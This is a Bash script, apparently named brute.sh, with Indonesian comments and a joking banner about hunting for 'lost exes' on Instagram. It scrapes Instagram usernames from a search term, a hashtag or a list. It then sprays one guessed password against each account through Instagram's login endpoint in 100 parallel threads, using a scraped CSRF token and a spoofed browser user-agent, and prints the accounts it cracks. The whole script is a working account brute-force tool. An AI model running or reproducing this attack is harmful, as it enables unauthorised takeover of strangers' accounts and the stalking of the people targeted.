#!/bin/bash
#author Mr Bell


#color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

#thread limit => kurangi boleh tapi jangan naikin :v
limit=100

#banner
clear
echo   "          SELAMAT DATANG DI	               "
echo   " PROGRAM PENCARI CABE-CABEAN INSTAGRAM         "
echo   "         |||||||||	      		       "  
echo   "         █████████       		       "   
echo   "     	 █▄█████▄█          		       "
echo   "         █ ▼▼▼▼▼  _-_--.                       "
echo   "         █.    _-_-- -_ hotttttttt !!!         "
echo   "         █ ▲▲▲▲▲   -_ -                        "  
echo   "      	 █████████                             "
echo   "       	   ██ ██                	       "
echo   " DIGUNAKAN UNTUK MENCARI MANTAN YANG HILANG!!! "  
echo   ""


#dependencies
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
        exit
    }
done

#menu
echo -e '''
1]. Target buronan menggunkan username \e[1;31m@username\e[1;37m
2]. Target buronan menggunkan hashtag \e[1;31m#hashtag\e[1;37m
'''

read -p $'Masukan Nomer antara 1 / 2   : \e[1;33m' opt

touch target

case $opt in
    1) #menu 1
        read -p $'\e[37m[\e[34m?\e[37m] Cari berdasarkan nama mantan : \e[1;33m' ask
        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
        echo $'\e[37m[\e[34m+\e[37m] jumlah yang didapat : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
        read -p $'[\e[1;34m?\e[1;37m] Password sesuai insting anda : \e[1;33m' pass
        echo -e "${white}[${yellow}!${white}] ${red}Mulai mencari Mantan...${white}"
        ;;
    2) #menu 2
        read -p $'\e[37m[\e[34m?\e[37m] Hashtag yang sering digunakan : \e[1;33m' hashtag
        get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
        if [[ $get =~ "Page Not Found" ]]; then
        echo -e "$hashtag : ${red}Hashtag not found${white}"
        exit
        else
            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
            echo -e "${white}[${blue}!${white}] Removing duplicate user from tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
            echo -e "[${blue}+${white}] jumlah yang didapat : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
            read -p $'[\e[34m?\e[37m] Password sesuai insting anda : \e[1;33m' pass
            echo -e "${white}[${yellow}!${white}] ${red}Mulai mencari Mantan...${white}"
            for tag in $(cat hashtag); do
                echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
            done
            wait
            rm hashtag result
        fi
        ;;
    3) #menu 3
        read -p $'\e[37m[\e[34m?\e[37m] Input your list   : \e[1;33m' list
        if [[ ! -e $list ]]; then
            echo -e "${red}file not found${white}"
            exit
            else
                cat $list > target
                echo -e "[${blue}+${white}] jumlah yang didapat   : ${yellow}"$(< target wc -l)
                read -p $'[\e[34m?\e[37m] Password sesuai insting anda   : \e[1;33m' pass
                echo -e "${white}[${yellow}!${white}] ${red}Mulai mencari Mantan...${white}"
        fi
        ;;
    *) #wrong menu
        echo -e "${white}options are not on the menu"
        sleep 1
        clear
        bash brute.sh
esac

#start_brute
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    -H "cookie: csrftoken=${token}" \
                    -H "origin: https://www.instagram.com" \
                    -H "referer: https://www.instagram.com/accounts/login/" \
                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                    -H "x-csrftoken: ${token}" \
                    -H "x-requested-with: XMLHttpRequest" \
                    -d "username=${i}&password=${pass}")
                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                            elif [[ $url =~ "checkpoint_required" ]]; then
                                    echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
                    fi
}

#thread
(
    for i in $(cat target); do
        ((thread=thread%limit)); ((thread++==0)) && wait
        brute "$i" &
    done
    wait
)

rm target
